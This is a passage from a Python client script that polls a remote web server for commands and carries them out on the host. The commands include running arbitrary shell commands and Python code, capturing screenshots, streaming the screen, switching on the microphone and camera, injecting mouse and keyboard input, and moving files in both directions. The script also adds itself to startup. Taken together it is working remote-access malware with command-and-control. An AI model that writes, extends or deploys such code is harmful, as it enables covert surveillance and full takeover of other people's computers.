        len(items),
        "file(s)",
        flush=True
    )

    for item in items:

        relative = upload_relative_path(item.get("path"))
        url = item.get("url")

        if not relative or not url:
            errors.append("invalid file entry")
            continue

        try:

            response = session.get(
                WEBSITE + url,
                timeout=120
            )

            response.raise_for_status()

            destination = os.path.join(
                target_root,
                *relative.split("/")
            )

            os.makedirs(
                os.path.dirname(destination),
                exist_ok=True
            )

            with open(destination, "wb") as handle:
                handle.write(response.content)

            saved += 1

        except Exception as error:

            errors.append(str(error)[:120])

    message = "" if saved == len(items) else (
        "; ".join(errors)[:300]
        or "Some files were not saved."
    )

    try:

        session.post(
            WEBSITE + "/api/downloader/complete",
            json={
                "transfer_id": transfer_id,
                "name": identity["name"],
                "success": saved == len(items),
                "message": message
            },
            timeout=20
        ).raise_for_status()

    except requests.RequestException as error:

        print(
            "[RECEIVE] Could not report the result:",
            error,
            flush=True
        )

    print(
        "[RECEIVE] Saved",
        saved,
        "of",
        len(items),
        "file(s) to",
        target_root,
        flush=True
    )


# ==================================================
# SERVER ACTIONS
# ==================================================

def handle_action(action):

    action_type = action.get("action")

    if action_type == "screenshot":

        request_id = action.get("request_id")

        if request_id:
            capture_screenshot(request_id)

    elif action_type == "download":

        handle_download(action)

    elif action_type == "receive_files":

        threading.Thread(
            target=handle_receive_files,
            args=(action,),
            daemon=True
        ).start()

    elif action_type == "list_dir":

        threading.Thread(
            target=handle_list_dir,
            args=(action,),
            daemon=True
        ).start()

    elif action_type == "stream_start":

        start_stream()

    elif action_type == "stream_stop":

        stop_stream()

    elif action_type == "mouse_click":

        handle_mouse_click(action)

    elif action_type in ("mouse_down", "mouse_up"):

        handle_mouse_button(action)

    elif action_type == "mouse_scroll":

        handle_mouse_scroll(action)

    elif action_type == "key_press":

        handle_key_press(action)

    elif action_type == "key_text":

        handle_key_text(action)

    elif action_type == "mic_start":

        start_mic()

    elif action_type == "mic_stop":

        stop_mic()

    elif action_type == "camera_start":

        start_camera()

    elif action_type == "camera_stop":

        stop_camera()

    elif action_type == "console":

        command_id = action.get("command_id")
        command = action.get("command")

        if command_id and command:

            threading.Thread(
                target=execute_console_command,
                args=(command_id, command),
                daemon=True
            ).start()

    elif action_type == "python_setup":

        command_id = action.get("command_id")

        if command_id:

            threading.Thread(
                target=handle_python_setup,
                args=(command_id,),
                daemon=True
            ).start()

    elif action_type == "python":

        request_id = action.get("request_id")
        code = action.get("code")

        if request_id and code:

            threading.Thread(
                target=execute_python_code,
                args=(request_id, code),
                daemon=True
            ).start()


# ==================================================
# POLLING LOOP
# ==================================================

def listen_for_actions():

    while not stop_event.is_set() and not registered_event.is_set():
        stop_event.wait(1)

    if stop_event.is_set():
        return

    print("[CLIENT] Computer:", COMPUTER_NAME, flush=True)
    print("[CLIENT] Name on server:", identity["name"], flush=True)
    print("[CLIENT] Shared folder:", shared_folder, flush=True)
    print("[CLIENT] Website:", WEBSITE, flush=True)

    while not stop_event.is_set():

        try:

            response = session.get(
                WEBSITE + "/next-action",
                params={"name": identity["name"]},
                timeout=10
            )

            response.raise_for_status()

            action = response.json()

            if action.get("action"):
                handle_action(action)

            stop_event.wait(POLL_INTERVAL)

        except requests.RequestException as error:
            print("[CONNECTION] Error:", error, flush=True)
            stop_event.wait(5)

        except Exception as error:
            print("[CLIENT] Error:", error, flush=True)
            stop_event.wait(5)

    print("[CLIENT] Worker stopped.", flush=True)


# ==================================================
# MAIN
# ==================================================

def main():

    global shared_folder, console_cwd

    if not os.path.isdir(SHARED_FOLDER):
        print("[ERROR] Shared folder does not exist:", SHARED_FOLDER)
        return

    shared_folder = os.path.realpath(SHARED_FOLDER)
    console_cwd = shared_folder

    ensure_startup_entry()

    sync_thread = threading.Thread(
        target=sync_loop,
        daemon=True
    )

    worker = threading.Thread(
        target=listen_for_actions,
        daemon=False
    )

    try:

        sync_thread.start()
        worker.start()

        while worker.is_alive():
            worker.join(timeout=1)

    except KeyboardInterrupt:
        print("\n[CLIENT] Shutdown requested.", flush=True)

    finally:

        stop_event.set()
        stream_stop_event.set()
        mic_stop_event.set()
        camera_stop_event.set()

        if worker.is_alive():
            worker.join()

        if stream_thread and stream_thread.is_alive():
            stream_thread.join(timeout=5)

        if mic_thread and mic_thread.is_alive():
            mic_thread.join(timeout=5)

        if camera_thread and camera_thread.is_alive():
            camera_thread.join(timeout=5)

        session.close()

        print("[CLIENT] Shutdown complete.", flush=True)


if __name__ == "__main__":
    main()
